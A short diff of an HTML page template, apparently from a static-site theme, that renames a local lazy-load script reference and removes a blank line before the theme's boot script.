 
@@ -591,7 +579,7 @@
 
   
     
-      <script  src="/js/lazyload.js" ></script>
+      <script  src="/js/img-lazyload.js" ></script>
     
   
 
@@ -710,7 +698,6 @@
 
 <!-- 主题的启动项 保持在最底部 -->
 <script  src="/js/boot.js" ></script>
-
 
 
 </body>
